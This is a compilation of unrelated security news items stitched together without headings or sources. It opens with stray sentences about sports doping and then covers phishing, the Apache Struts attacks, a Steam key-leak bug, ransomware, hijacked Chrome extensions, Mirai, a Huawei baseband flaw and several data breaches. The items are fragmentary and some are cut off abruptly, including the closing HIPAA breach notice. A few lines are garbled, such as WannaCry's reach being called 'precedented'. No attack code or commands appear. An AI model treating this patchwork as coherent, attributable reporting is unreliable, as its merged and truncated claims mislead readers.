Wiggins retired last year under something of a cloud after it was revealed he took corticosteroid triamcinolone for asthma, although he broke no anti-doping rules.
The IAAF banned Russia’s athletics federation after a WADA commission report found evidence of state-sponsored doping.
Almost all Russia’s athletes missed the track and field events at the Rio Olympics last year and are likely to also miss the world athletics championships in London in August.

The BBC recently uncovered that scammers are attempting to trick us through the abuse of multilingual character sets. By creating these lookalike sites with domain names that are almost identical to the URLs we know and trust, it’s made telling the difference between fake and genuine sites – and avoiding phishing scams – increasingly difficult.
Research by security company Wandera revealed that people are three times more likely to fall for a phishing scam if it is on their phone. 
As a result, this new scam targets smartphone users, where the lookalike sites are harder to spot.

A recent survey that tested the British public’s knowledge of scams and online security behaviours found 16% of British adults have experienced online fraud. For phishing scams specifically, it’s one in ten of us.
The most common age group to experience online fraud is 35 – 54, with almost one-fifth (19%) of this demographic having fallen victim to a scam.
CEO of Get Safe Online, Tony Neate, said:
“While online fraud is common, it becomes less so when you engage common sense.
“It is very easy to clone a real website and does not take a skilled developer long to produce a very professional-looking but malicious site, but if you know what to look for, it’s easy to stay safe.” 

There are numerous ways to determine whether or not a received email is from a legitimate company trying to help, or a scammer looking to steal financial details.
The initial sender is a good starting point. Take the time to look at the email address you’re being contacted by, not just the name. An unfamiliar address, or one that doesn’t correspond with the company, is a giveaway that it’s a fraudster.
Then take a look at the greeting. If the email opens with ‘Dear loyal customer’ or ‘Hello (followed by your email address)’ then it’s another telltale sign. The real company would address you by your full name and make it personal to you.
Careless slip-ups in the copy of the email are also giveaways. Does any of the grammar or spelling not sit quite right? This is a big indicator that it’s a phishing scam. You wouldn’t expect poor language by someone from a legitimate company.

A few days ago, Microsoft issued an emergency patch for Internet Explorer to fix a zero-day vulnerability in the web browser.
The problem affects versions of Internet Explorer from 9 to 11 across multiple versions of Windows, but it seems that the patch has been causing problems for many people. Specifically, people with some Lenovo laptops have found that after installing the KB4467691 patch they are unable to start Windows. 
When the patch was released, it was known that there were a few issues with older versions of Windows 10 -- for example, problems with the .NET framework, and with web links in the Start menu.
But since the initial release, Microsoft has updated the patch page to indicate a further potential problem with some Lenovo laptops:
    After installing KB4467691, Windows may fail to startup on certain Lenovo laptops that have less than 8 GB of RAM.
The company goes on to suggest a couple of possible workarounds for those running into issues:
    Restart the affected machine using the Unified Extensible Firmware Interface (UEFI). Disable Secure Boot and then restart.
    If BitLocker is enabled on your machine, you may have to go through BitLocker recovery after Secure Boot has been disabled.
Microsoft says that it is ""working with Lenovo and will provide an update in an upcoming release"".

Anonymous also leaked a majority of data from Freedom Hosting II, which included over 380,000 user records.
Now we have learned that after the abovementioned cyber-attack, the number of hidden services on the Dark Web has lowered significantly.
This revelation was made after an analysis was carried out using OnionScan.
According to the OnionScan report, out of over 30,000 Tor-based hidden services, only 4,400 are active on the Dark Web currently.
It is much lower in comparison to previous such scans, stated the OnionScan project operator Sarah Jamie Lewis.
This is why, noted Lewis, the number of hidden services has reduced so much including the secure email platform Sigaint, which went offline unannounced in mid-February.
Apart from the absence of such a huge number of hidden services, the scan report also detected 4,000 HTTP services, 250 TLS services, 270 SSH services, 100 SMTP services, 220 Bitcoin nodes and some FTP and VNC services too on the Dark Web.
Here the question arises, why Tor-based services have been removed?
The reason could be that a majority of users have started to perceive Dark Web as a platform dedicated to criminality oriented or illegal activities.
Furthermore, it is a fact that just like maintaining anonymity on Tor is difficult in the same manner hosting a hidden service on the Dark Web is daunting as it required high-level skills and technical abilities.

In a string of attacks that have escalated over the past 48 hours, hackers are actively exploiting a critical vulnerability that allows them to take almost complete control of Web servers used by banks, government agencies, and large Internet companies.
The code-execution bug resides in the Apache Struts 2 Web application framework and is trivial to exploit.
Although maintainers of the open source project patched the vulnerability on Monday, it remains under attack by hackers who are exploiting it to inject commands of their choice into Struts servers that have yet to install the update, researchers are warning.
Making matters worse, at least two working exploits are publicly available.
""We have dedicated hours to reporting to companies, governments, manufacturers, and even individuals to patch and correct the vulnerability as soon as possible, but the exploit has already jumped to the big pages of 'advisories,' and massive attempts to exploit the Internet have already been observed.""
Researchers at Cisco Systems said they are seeing a ""high number of exploitation events"" by hackers attempting to carry out a variety of malicious acts.
One series of commands that attackers are injecting into webpages stops the firewall protecting the server and then downloads and executes malware of the attacker's choice.
The payloads include ""IRC bouncers,"" which allow the attackers to hide their real IP address during Internet chats; denial-of-service bots; and various other packages that conscript a server into a botnet.
""These are several of the many examples of attacks we are currently observing and blocking,"" Cisco's Nick Biasini wrote.
""They fall into two broad categories: probing and malware distribution.
The payloads being delivered vary considerably, and to their credit, many of the sites have already been taken down and the payloads are no longer available.""
The vulnerability resides in what's known as the Jakarta file upload multipart parser, which according to official Apache Struts 2 documentation is a standard part of the framework and needs only a supporting library to function.
Apache Struts versions affected by the vulnerability include Struts 2.3.5 through 2.3.31, and 2.5 through 2.5.10.
Servers running any of these versions should upgrade to 2.3.32 or 2.5.10.1 immediately.
It's not clear why the vulnerability is being exploited so widely 48 hours after a patch was released.
One possibility is that the Apache Struts maintainers didn't adequately communicate the risk.
Although they categorize the vulnerability security rating as high, they also describe it as posing a ""possible remote code execution"" risk.
Outside researchers, meanwhile, have said the exploits are trivial to carry out, are highly reliable, and require no authentication.
It's also easy to scan the Internet for vulnerable servers.
It's also possible to exploit the bug even if a Web application doesn't implement file upload functionality.
Update 3/9/2017 10:07 California time: In a comment to this post, Ars Technology Editor Peter Bright provides a much more plausible explanation for the delay in patching this highly critical vulnerability.
Most bug fixes, he pointed out, require downloading and installing a patch, possibly rebooting a machine, and being done with it.

A bloke has told how he discovered a bug in Valve's Steam marketplace that could have been exploited by thieves to steal game license keys and play pirated titles.
Researcher Artem Moskowsky told The Register earlier this week that he stumbled across the vulnerability – which earned him a $20,000 bug bounty for reporting it – by accident while looking over the Steam partner portal. That's the site developers use to manage the games they make available for download from Steam.
A professional bug-hunter and pentester, Moskowsky said he has been doing security research since he was in school, and for the past several years, he has made a career out of finding and reporting flaws.
In this case, while looking through the Steam developer site, he noticed it was fairly easy to change parameters in an API request, and get activation keys for a selected game in return. Those keys, also known as CD keys, can be used to activate and play games downloaded from Steam. The API is provided so developers and their partners can obtain license keys for their titles to pass onto gamers.
""This bug was discovered randomly during the exploration of the functionality of a web application,"" Moskowsky explained. ""It could have been used by any attacker who had access to the portal.""
Essentially, anyone who had an account on the developer portal would be able to access the game activation keys for any other game Steam hosted, and sell or distribute them for pirates to use to play games from Steam. Fetching from the /partnercdkeys/assignkeys/ API with a zero key count returned a huge bunch of activation keys.
""To exploit the vulnerability, it was necessary to make only one request,"" Moskowsky told El Reg. ""I managed to bypass the verification of ownership of the game by changing only one parameter. After that, I could enter any ID into another parameter and get any set of keys.""
How severe was the flaw? Moskowski says that, in one case, he entered a random string into the request, to pick a title at random, and in return he got 36,000 activation keys for Portal 2, a game that still retails for $9.99 in the Steam store.
Fortunately for Valve, Moskowsky opted to privately come forward with the flaw via HackerOne. The programming blunder has since been fixed.
As the HackerOne entry for the vulnerability shows, Moskowsky first submitted the report on the flaw in early August. Three days later, Valve handed out the $15,000 bounty as well as a $5,000 bonus for the find, though Valve only allowed the report to go public on October 31.
The researcher told us this is a pretty good turnaround, and Valve in particular is very good with handling researcher requests and paying out bug bounties.
Impressively, this $20,000 bounty isn't even the biggest payout Moskowsky has received from the games service. Back in July he was given a cool $25,000 for weeding out a SQL Injection bug in the same developer portal.

Ransomware criminals chatting up victims, offering to delay deadlines, showing how to obtain Bitcoin, dispensing the kind of customer support that consumers lust for from their cable and mobile plan providers, PC and software makers?
Finnish security vendor F-Secure yesterday released 34 pages of transcripts from the group chat used by the crafters of the Spora ransomware family.
The back-and-forth not only put a spotlight on the gang's customer support chops, but, said a company security advisor, illustrated the intertwining of Bitcoin and extortion malware.
""We should be thankful that there are at least some practical barriers to purchase Bitcoins,"" wrote Sean Sullivan of F-Secure in a Wednesday post to the firm's blog.
""If it were any easier to do so, very little else would check the growth of crypto-ransomware's business model.""
Sullivan originally penned that conclusion last month, in a short section of the ""State of Cyber Security"" report that F-Secure published then.
Yesterday, F-Secure posted the transcripts, 20,000 words or more, and dubbed the collection a ""new supplemental appendix"" to the original report.
In one exchange, a Spora victim said he or she had paid the extortion fee, but had gotten nothing in return.
""The malware technology to encrypt data has been possible for many, many years; the bigger challenge has always been getting paid,"" Sullivan pointed out.
""In the past, cyber-crime schemes (such as scareware) have been killed off by disrupting the money supply.
The same may well be true of cyber extortion; to kill the business model, it may be necessary to ban Bitcoin.""

The OurMine hackers are back in the news again. This time the group hacked and defaced the official domain of Unity 3D Forums leaving a deface page along with a note over the weekend. 
The hack which took place on 30th April allowed the Saudi Arabia-based OurMine hacking group to compromise the forum’s security and leave a note stating “Hacked by OurMine, Your Security is low.”
Unity 3D administrators have acknowledged the hack but stated that no password was stolen in the attack and that the 2FA Authentication will be introduced to the forums for better security. Furthermore, the administrators are also planning to bring Device Identification and Password Policy on the forums. According to the official statement from Unity 3D:
Thanks to everyone that have reached out about our forums being compromised – we are on it!
— Unity (@unity3d) April 30, 2017
One of the team members from Unity stated on Reddit that: 
After the hack, the Unity 3D forums was down for maintenance though at the time of publishing this article the forums were online and reachable. However, if you have an account on Unity 3D forums it is advised that you change your password.
Just in case if you are not familiar with the OurMine then this is the same group who conducted the biggest hack in YouTube’s history last month by taking over hundreds of popular YouTube accounts and defacing their titles with #OurMine signature. The same group was in the news for hacking Google’s CEO Sundar Pichai, Facebook’s CEO Mark Zuckerberg, Co-founder of Twitter Jack Dorsey and several other top media celebrities and news outlets.
It is unclear how OurMine hacks its victims but researchers believe that the group uses passwords stolen from previous data breaches including LinkedIn and MySpace. The group is also working on establishing itself as an IT security firm to help companies against cyber attacks, however, it is unclear whether such tactics will give them clients or scare them away.

 Attackers have been phishing developers as a way of compromising Chrome extensions into spreading affiliate program ads that scare victims into paying for PC repairs.
Proofpoint researcher Kafeine has identified six compromised Chrome extensions that have been recently modified by an attacker after phishing a developer's Google Account credentials.
 Web Developer 0.4.9, Chrometana 1.1.3, Infinity New Tab 3.12.3, Copyfish 2.8.5, Web Paint 1.2.1, and Social Fixer 20.1.1 were compromised in late July and early August. Kafeine believes TouchVPN and Betternet VPN were also comprised in late June with the same technique.
Developers of several of the extensions have removed the threat in recent updates to their affected apps, including Web Developer, Copyfish, Chrometana, and Social Fixer.
The main intent of the attack on Chrome extension developers is to divert Chrome users to affiliate programs and switch out legitimate ads with malicious ones, ultimately to generate money for the attacker through referrals.
 The attackers have also been gathering credentials of users of Cloudflare, an availability service for website operators, which probably could be used in future attacks.
The hijacked extensions were coded mostly to substitute banner ads on adult websites, but also a range of other sites, and to steal traffic from legitimate ad networks.
 ""In many cases, victims were presented with fake JavaScript alerts prompting them to repair their PC, then redirecting them to affiliate programs from which the threat actors could profit,"" notes Kafeine.
At least one of the affiliate programs receiving the hijacked traffic promoted PCKeeper, a Windows-focused tool originally from ZeobitLLC, the maker of the MacKeeper security product that was the subject of a class action suit a few years ago over false security claims.
A snippet of JavaScript in the compromised extensions also downloaded a file that was served by Cloudflare containing code with a script designed to collect Cloudflare user credentials after login. Cloudflare stopped serving the file after it was alerted to the issue by Proofpoint.
The phishing emails that compromised developers' Google Accounts purported to come from Google's Chrome Web Store team, which claimed the developer's extension didn't comply with its policies and would be removed unless the issue was fixed.
As Bleeping Computer recently reported, Google's security team has sent an email warning to Chrome extension developers to be on the lookout for phishing attacks. The attackers had created a convincing copy of Google's real account login page.
It's not the first time Chrome extensions have been targeted to spread adware and promote affiliate networks. In 2014, adware firms bought several popular Chrome extensions from legitimate developers, which up to that point had maintained trustworthy products.

Developers are once again being blamed for cloud back-end security vulnerabilities, this time in a new report from Appthority.
The company published investigation results that found nearly 43 TB of enterprise data was exposed on cloud back-ends, including personally identifiable information (PII). This comes just shortly after a similar report from a different security company.
In the new ""2017 Q2 Enterprise Mobile Threat Report"" report (free upon providing registration info), Appthority found ""data leakage"" from mobile apps that send data to unsecured cloud back-ends. While security concerns typically focus on a triad of other factors -- apps, device threats and network threats -- this data leakage on the back-end was dubbed the ""HospitalGown"" threat because of that garment's open back-end. 
""In total, we found almost 43 TB of data exposed and 1,000 apps affected by the HospitalGown vulnerability,"" Appthority said in a blog post last week. ""Looking at a subset of 39 apps, we still found 280 million records exposed, a total of about 163 GB of data. This is a staggering amount of leaked information, and in some cases represents the entirety of customer or operational data for an enterprise.""
The report echoes the findings of an earlier report by RedLock Inc., which revealed many security issues primarily caused by user misconfigurations on public cloud platforms. RedLock claimed it found 82 percent of hosted databases remain unencrypted, among many other problems.
As with the RedLock report, developers were blamed for the HospitalGown vulnerabilities. "" HospitalGown is a vulnerability to data exposure caused, not by any code in the app, but by the app developers' failure to properly secure the back-end (hence its name) servers with which the app communicates and where sensitive data is stored,"" Appthority said. 
Unsecured Elasticsearch servers and MongoDB databases were prime targets of a series of ransomware attacks earlier this year that generated widespread publicity in the security field. However, that publicity apparently wasn't enough to significantly alleviate the issue.
""As our findings show, weakly secured back-ends in apps used by employees, partners and customers create a range of security risks including extensive data leaks of personally identifiable information (PII) and other sensitive data,"" the report states. ""They also significantly increase the risk of spear phishing, brute force login, social engineering, data ransom, and other attacks. And, HospitalGown makes data access and exfiltration far easier than other types of attacks."" 
Key findings of the report as listed by the company include:
    Affected apps are connecting to unsecured data stores on popular enterprise services, such as Elasticsearch and MySQL, which are leaking large amounts of sensitive data.
    Apps using just one of these services revealed almost 43TB of exposed data.
    Multiple affected apps leaked some form of PII, including passwords, location, travel and payment details, corporate profile data (including employees' VPN PINs, emails, phone numbers), and retail customer data.
    Enterprise security teams do not have visibility into the risk due to the risk's location in the mobile app vendor's architecture stack.
    In multiple cases, data has already been accessed by unauthorized individuals and ransomed.
    Even apps that have been removed from devices and the app stores still pose an exposure risk due to the sensitive data that remains stored on unsecured servers.
The company said its Mobile Threat Team identified the HospitalGown vulnerabilities with a combination of its dynamic app analysis tool and a new back-end scanning method, looking at the network traffic on more than 1 million enterprise mobile apps, both iOS and Android.
As with the misconfiguration problems identified in the RedLock report, Appthority emphasized that all cases of HospitalGown vulnerabilities were caused by human errors, not malicious intent or inherent infrastructure problems.
That human error was especially prevalent in two app implementations investigated by Appthority: Pulse Workspace (for accessing enterprise network and Web applications) and Jacto apps (from an agricultural machinery company).

When tragedy strikes, criminals invariably prey on people’s best intentions.
Scammers have been using Hurricane Harvey-themed messages to trick people into opening phishing emails and links on social media sites, which can steal login information, infect machines with malware, or con victims out of money. US-CERT, a cybersecurity arm of the U.S. Department of Homeland Security, issued a warning about the threat on Monday.
“[R]emain vigilant for malicious cyber activity seeking to capitalize on interest in Hurricane Harvey,” the advisory read. “Emails requesting donations from duplicitous charitable organizations commonly appear after major natural disasters.”
As the advisory notes, a common scam during and after natural disasters is for fraudsters to pretend to set up relief funds and request donations. Fortune has seen several suspicious online profiles and personas that, although their legitimacy couldn’t be determined, raised several red flags: a small number of followers, unverified accounts, no apparent links to accredited charities, and no means to track where proceeds go.
Zack Allen, threat operations manager at ZeroFOX, a social media-focused cybersecurity startup, says the ruse is a typical one. “Cybercriminals are opportunists and, sadly, a crisis like Hurricane Harvey is a prime example of their preying on humanity’s empathy and trust,” he wrote in an email to Fortune. “People all over the world quickly rushed to their social media accounts to find the best avenues to donate to victims, but these same avenues are ideal for scammers who try to convince victims to donate to their fraudulent Hurricane Harvey cause.”
Kevin Epstein, vice president of threat operations at Proofpoint (pfpt, +1.21%), a cybersecurity firm that provides email protection, said that in recent days he has seen hurricane-related snares such as “see this terrifying video” or pleas to “donate to the relief effort.” One PDF attachment titled “hurricane harvey – nueces county news release 11 – it’s your chance to help.pdf” prompted people, when opened, to enter their email username and password, he told Fortune.
It’s common for fraudsters to take advantage of news du jour to bait prospective victims. “Consistently, attackers use world events as themes for their attacks,” said Oren Falkowitz, CEO at Area1 Security, a cybersecurity startup that fights phishing. He noted that attacks related to tax season and national elections were examples of recent popular lures.
A few tips you can use to stay safe: First, keep your software up to date. Hackers often try to compromise devices running outdated software that has security holes.
Second, be careful what you click: Don’t accept or open unsolicited content from untrusted sources. (You should even be wary of trusted contacts, as they too may have been compromised.)
Third, be sure the organizations to which you’re contributing money are legitimate. Here’s a rundown of some reputable charities assembled by Fortune. US-CERT further recommends reviewing these safety guidelines from by the Federal Trade Commission for Hurricane Harvey-related charitable giving, and cross-checking organizations on this directory of national charities from the Better Business Bureau.

A widely reported e-mail purporting to be a request to share a Google Docs document is actually a well-disguised phishing attack. It directs the user to a lookalike site and grants the site access to the target's Google credentials. If the victim clicks on the prompt to give the site permission to use Google credentials, the phish then harvests all the contacts in the victim's Gmail address book and adds them to its list of targets.
The phish appears to have been initially targeted at a number of reporters, but it quickly spread widely across the Internet. Some of the sites associated with the attack appear to have been shut down.
The e-mail uses a technique that a Trend Micro report linked last week to Pawn Storm, an ongoing espionage campaign frequently attributed to Russian intelligence operations. The attack uses the OAuth authentication interface, which is also used by many Web services to allow users to log in without using a password. By abusing OAuth, the attack is able to present a legitimate Google dialogue box requesting authorization. However, the authentication also asks permission for access to ""view and manage your e-mail"" and ""view and manage the files in your Google Drive.""
The fake application used in the Pawn Storm phish (which posed as a Google security alert) was named ""Google Defender."" Today's phish asks the target to grant access to ""Google Docs""—a fake application using the name of Google's service. If the target grants permission, the malicious site will immediately harvest contacts from the target's e-mail and send copies of the original message to them.

[Update, 4:40 pm EDT:] Google has struck hard at the worm. Not only have all the sites associated with the phish been taken offline, but the permissions associated with the worm have been dropped from victims' accounts.
The domains used in the attack were registered through NameCheap, and used a Panama-based privacy service to conceal the registration information. The hostnames were pointed at a server behind Cloudflare's content delivery and denial-of-service protection network.

Troubled browser has once again come under attack, with flaw discovered in multiple versions of Internet Explorer.
Microsoft has been forced to issue an emergency security patch for its Internet Explorer browser.
The release came after Google security engineer Clement Lecigne uncovered a critical vulnerability in several versions of Microsoft's browser, and could have been activated simply by directing users to a malicious website
The flaw, known as CVE-2018-8653, affects Internet Explorer 9, 10 and 11, with the update issued to Windows 7, 8.1 and 10 versions, as well as Windows Server 2008, 2012, 2016 and 2019.
""A remote code execution vulnerability exists in the way that the scripting engine handles objects in memory in Internet Explorer,"" Microsoft stated in its support document for the threat. ""The vulnerability could corrupt memory in such a way that an attacker could execute arbitrary code in the context of the current user.""
The company has issued a fix for the flaw now, outside of its typical Patch Tuesday security cycle, signifying it is a significant threat and should be patched immediately.
Microsoft has gradually retired Internet Explorer from public view over the past few years as it focuses on its newer browser Edge, with only customised versions available to certain business users.
The company may also be about to pull the plug on Edge as well, with report recently confirming Microsoft is set to introduce a new browser built on Google's Chromium platform.

Payday loan firm Wonga has suffered a data breach affecting up to 245,000 customers in the U.K. A further 25,000 customers in Poland may also be affected, according to the BBC.
It says it does not believe customers’ Wonga account passwords were compromised but suggests concerned users change their password anyway.
Wonga is warning affected customers to be “extra vigilant” and to alert their bank of potential risk — though it says it will also be contacting financial institutions about the breach.
We’ve reached out to Wonga with questions and will update this story with any response.
Update: In a statement a spokesperson for the company told us: “Wonga is urgently investigating illegal and unauthorised access to the personal data of some of its customers in the UK and Poland.
We are working closely with authorities and we are in the process of informing affected customers.
According to The Guardian, the company became aware of a problem last week but only realized on Friday that data could be accessed externally, and only started contacting affected customers on Saturday.
The U.K.’s data protection regulator, the ICO, has apparently been informed of the breach — although it’s unclear when.
An ICO spokesperson did not respond to the question, providing this statement instead: “All organisations have a responsibility to keep customers’ personal information secure.
Where we find this has not happened, we can investigate and may take enforcement action”.
Back in 2014 the company had to write down $340 million in unpaid loans, following an investigation by the U.K.’s Competition and Markets Authority over its lending practices.
It was also fined by the regulator for sending fake lawyers’ letters to customers in arrears.
Although Wonga attracted substantial tech investment for a real-time automated decision-making platform for affordability checks, it ended up having to write off the loans of 330,000 customers, and waive the interest and fees for a further 45,000 — raising questions about the efficacy of its algorithms.
Tightened criteria on short-term loans by the U.K. financial regulator ultimately shrunk the size of Wonga’s business, which saw losses double in 2015 — to £80.2 million.

In wake of last week’s ransomware attack, technology specialists warn that ‘paying money to a criminal is never a good idea’
Cybersecurity experts have warned businesses against meeting hackers’ demands for money in the wake of the “unprecedented” attack on hundreds of thousands of computer systems around the world.
Ransomware is a type of malicious software that blocks access to a computer or its data and demands money to release it. The worm used in Friday’s attack, dubbed WannaCry or WanaCrypt0r, encrypted more than 200,000 computers in more than 150 countries for ransoms of $300 to $600 to restore access.
The full damage of the attack and its economic cost was still unclear, but Europol’s director, Rob Wainwright, said its global reach was precedented, and more victims were likely to become known in the coming days.
The extent of the WannaCry attack prompted questions about what to do in the event of a ransomware infection, with many experts advising against paying the ransom, saying not only could it fail to release the data, it could expose victims to further risk.
Peter Coroneos, the former chief executive of the Internet Industry Association and an expert on cyber policy, said whether or not to agree to ransomware demands presented practical and ethical dilemmas.
“These people are criminals, and paying money to a criminal is never a good idea. However, if it’s a trade-off between losing your lifetime’s family photos and making a payment to a criminal, then it’s up to the individual to make that judgment call.
“It would be very hard to walk away.”
But Gregory said it would be “self-defeating” for hackers not to release data upon receipt of a ransom, “because that would immediately hit the media, and no one would pay”.
But not all ransomware attacks were motivated by financial gains, he added.
“If they’re a professional criminal organisation, their business model will be to release people’s computers once they’ve paid the money, but you don’t know. It could be someone having a laugh, or someone who’s trying to learn, or someone who’s released it accidentally.
“You just do not know – that’s the problem.”
With such attacks hitting computer systems at an “ever-increasing rate”, Gregory said prevention was the best course of action.
With outdated operating systems “easy targets”, he urged individuals and businesses to automate updates and invest in software that protected against viruses, malware and ransomware across not only their computers, but tablets and mobile phones as well.
“It’s a combination of factors that will keep people safe ... For individuals, families have got to work together and companies have to take the time to ensure that their cybersecurity practices are up to date.”
Gregory recommended regular if not daily backups of personal data, which would allow victims to wipe the infected computer, reload their data, and start again.

United Kingdom authorities arrested two suspects in relation to January's hacking of Washington police surveillance cameras, International Business Times reported Friday.
The cyberattack affected 123 of the city's 187 network video recorders, city officials said, leaving the infected cameras unable to record between Jan 12 and Jan 15.
The National Crime Agency arrested a British man and Swedish woman, both 50, in a South London neighborhood, according to the report. 
The incident attracted particular attention because it came just days before President Trump's inauguration. 
The hack involved ransomware, a type of software that disables systems until demands are met. Washington's chief technology officer said that no ransom was paid in this instance. Instead, the city repaired damage from the attack on its own. 
City officials say the attack posed no risk to the public or the security of the inauguration.

The Mirai malware was initially developed in late 2015 and early 2016, and only became a massive threat in the summer and autumn of 2016, when it spread to hundreds of thousands of routers and DVRs (deployed with smart cameras and CCTV systems).
After crooks used a botnet of Mirai-infected devices to launch DDoS attacks on the KrebsOnSecurity blog, increased attention from law enforcement forced the malware's author to dump the Mirai source code online.
This move resulted in tens of Mirai variants popping up everywhere, which in turn helped hide the author's tracks, or so the author thought, until this Brian Krebs exposé.
One of the recent developments on the Mirai malware front was discovered by Russian cyber-security firm Dr.Web, whose experts came across a Windows trojan built with the sole purpose of helping Mirai spread to even more devices.
Subsequent versions added the option to launch these password guessing attacks via SSH ports.
In all of this process, the Mirai self-spreading behavior was contained to devices running various versions of the Linux operating systems only.
The trojan discovered by Dr.Web (detected as Trojan.Mirai.1) helps crooks launch the password-guessing attacks from Windows devices, even if Mirai itself (detected as Linux.Mirai) won't be able to run on Windows.
If the Windows trojan infects another Windows device, then that device is used as another point to launch the password-guessing attacks.
Under the hood, the Mirai Windows trojan works by infecting a device, where it contacts an online C&C server and downloads a list of IP addresses.
Unlike the Linux version, the Windows trojan targets more ports.
When the Windows trojan manages to infect a new device, if the underlying platform runs Linux, it will execute a series of commands, which result in the creation of a new Mirai DDoS bot.
If the Windows trojan spreads to a new Windows device, it will drop a copy of itself there and continue to target new devices.
Additionally, researchers say that when the trojan infects a database, such as MSSQL and MySQL, the commands it receives tell it to create a new user with admin privileges, which attackers most likely use to steal data from infected devices.
The only case where the trojan doesn't do anything is if it manages to connect via RDP, in which case it just waits, most likely for a human operator to take control of the infected machine.
Dr.Web discovered the Mirai Windows version only this month, so it is currently unknown how this new development will affect the Mirai ecosystem.

The researcher Ralf-Phillip Weinmann, managing director at security firm Comsecuris, has disclosed a zero-day baseband vulnerability affecting Huawei smartphones, laptop WWAN modules, and IoT components.
Baseband is firmware used on smartphones to connect to cellular networks, to make voice calls, and transmit data.
An attacker can exploit baseband flaws to eavesdrop mobile communications, take over the device making calls and sending SMS messages to premium numbers or to exfiltrate data.
The expert revealed the flaw this week at the Infiltrate Conference, the vulnerability could be exploited by attackers to execute a memory-corruption attack against affected devices over the air.
Fortunately, the attack is quite difficult to conduct.
The baseband vulnerability resides in the HiSilicon Balong integrated 4G LTE modems. The Balong application processor is called Kirin, it is produced by the Hisilicon Technologies, a subsidiary of Huawei Technologies. The affected firmware is present in several Huawei Honor smartphones, including the P10, Huawei Mate 9, Honor 9, 7, 5c and 6.
Weinmann believes that millions of Honor smartphones could be exposed to the to attack.
Weinmann presented multiple baseband vulnerabilities found in the Kirin application processor.
The expert also revealed that many laptops produced by IT vendors leverage the HiSilicon Balong integrated modem, such as a number IoT devices.
“This baseband is much easier to exploit than other basebands. Why? I’m not sure if this was intentional, but the vendor actually published the source code for the baseband which is unusual,” Weinmann said. “Also, the malleability of this baseband implantation doesn’t just make it good for device experimenting, but also network testing.”
Weinmann speculates HiSilicon may have wrong released the Kirin source code as part of a developer tar archive associated with the Huawei H60 Linux kernel data.
Weinmann demonstrated several attack scenarios against mobile phones.
A first attack scenario presented by the researcher involves setting up a bogus base station using open-source software called OpenLTE that is used by an attacker to simulate a network operator. The attacker can send specially crafted packets over the air that trigger a stack buffer overflow in the LTE stack causing the phone crashing. Once the phone rebooted an attacker can gain persistence installing a rootkit.
In a second attack scenario, the attacker with a physical access to the phone and private key pair data would install malicious tools on the firmware.
“It requires key material that is stored both by the carrier and on the SIM card in order to pass the mutual authentication between the phone and the network. Without this key material, a base station cannot pose as a legit network towards the device.”
Weinmann used for its test his own VxWorks build environment using an evaluation version of VxWorks 7.0 that shipped with Intel Galileo several years ago. The expert explained that the existence of a Lua scripting interpreter running in the baseband gives him further offensive options.
Weinmann did not disclose the technical details to avoid threat actors in the wild will abuse his technology.
“I have chosen to only disclose lower-severity findings for now. Higher severity findings are in the pipeline.” Weinmann said.

Hong Kong's electoral office has apologized after two laptops were stolen, containing voter registration records along with the names of members of its Election Committee, which picked a new chief executive for the region last weekend. 
The REO says the laptops were stored in a locked room at the AsiaWorld Expo, a large conference facility next to Chek Lap Kok International Airport just north of Lantau Island.
""We apologize to the voters for the incident,"" the REO says. ""The REO will inform the affected voters about the incident as soon as possible.""
The data was stored in accordance with the ""relevant security requirements,"" including multiple layers of encryption, the REO says. It did not specific what type of encryption was used.
It also did not say how many voters might be affected, but Channel News Asia reported that Hong Kong has 3.7 million registered voters. Hong Kong's Privacy Commissioner for Personal Data has launched an investigation. 
On March 26, the Election Committee picked Carrie Lam as the first female chief executive of Hong Kong, which is formally known as the Hong Kong Special Administrative Region of the People's Republic of China. The election happens every five years.
The laptops were part of a backup system for the election. REO says the room, in Hall 7 of the AsiaWorld Expo, was monitored by closed-circuit television. The South China Morning Post reported that the door to the room was locked and required both a passcode and an access card for entry. It doesn't appear the door was forced open.
An anonymous source told the SCMP that the computers themselves were not expensive, leading investigators to believe that the equipment may have been intentionally targeted.
The laptops were left in the storeroom on March 22 and were still there two days later. The theft was discovered on March 27. The computers were taken out of their bags, which were left behind, the SCMP reported.

Following the news that a Lithuanian man had been charged over an email phishing scam attack against ""two US-based internet companies"" whose identities were not disclosed, it has been recently confirmed that the two companies involved were actually tech giants Google and Facebook.
In a report published April 27, Fortune disclosed the identities of both companies. The companies had been tricked into wiring over US$100 million to the alleged scammer’s bank accounts.
Evaldas Rimasauskas, 48, purportedly posed as an Asia-based manufacturer and deceived the two companies from at least 2013 to 2015.
""Fraudulent phishing emails were sent to employees and agents of the victim companies, which regularly conducted multimillion-dollar transactions with [the Asian] company,"" the US Department of Justice (DOJ) said.
The DOJ alleged that emails supposedly from the employees of said Asian manufacturer were sent from email accounts designed to look like they were actually from the firm.
Rimasauskas was charged by the DOJ in March of sending the forged emails, as well as for fabricating invoices, contracts and letters ""that falsely appeared to have been executed and signed by executives and agents of the victim companies.""
""We detected this fraud against our vendor management team and promptly alerted the authorities,"" a spokesperson for Google said in a statement. ""We recouped the funds and we're pleased this matter is resolved.""
""Facebook recovered the bulk of the funds shortly after the incident and has been cooperating with law enforcement in its investigation,"" a representative from Facebook said.
The BBC reported that neither Google nor Facebook revealed how much money they had transferred, or how much they recouped following the incident.
While the two companies have advanced cybersecurity measures in place, the phishing attacks targeted individuals through their emails — attacks that could have been avoided through proper verification of dubious payment requests.
""Sometimes staff [at large firms] think that they are defended, that security isn't part of their job,"" James Maude of cyber-security firm Avecto told the BBC. ""But people are part of the best security you can have — that's why you have to train them.""

ABCD Pediatrics, PA (“ABCD”) is committed to providing quality pediatric healthcare in the San Antonio area. Our mission is to provide the best care, to each patient, every time. With that being said, ABCD is writing to inform you about an incident that may have affected its patients’ protected health information. This notification is made in compliance with the Health Insurance Portability and Accountability Act of 1996 (HIPAA), Public Law 104-191, and the included Administrative Simplification provisions.
During the morning of February 6, 2017, an employee of ABCD Pediatrics discovered that a virus gained access and began encrypting ABCD’s servers. The encryption was slowed significantly by existing antivirus software. Upon discovery, ABCD immediately contacted its IT Company, and ABCD’s servers and computers were promptly moved offline and analyzed. ABCD’s IT Company identified the virus as “Dharma Ransomware,” which is a variant of an older ransomware virus called “CriSiS.” ABCD’s IT Company reported that these virus strains typically do not exfiltrate (“remove”) data from the server; however, exfiltration could not be ruled out. Also, during the analysis of ABCD’s servers and computers, suspicious user accounts were discovered suggesting that hackers may have accessed portions of ABCD’s network.
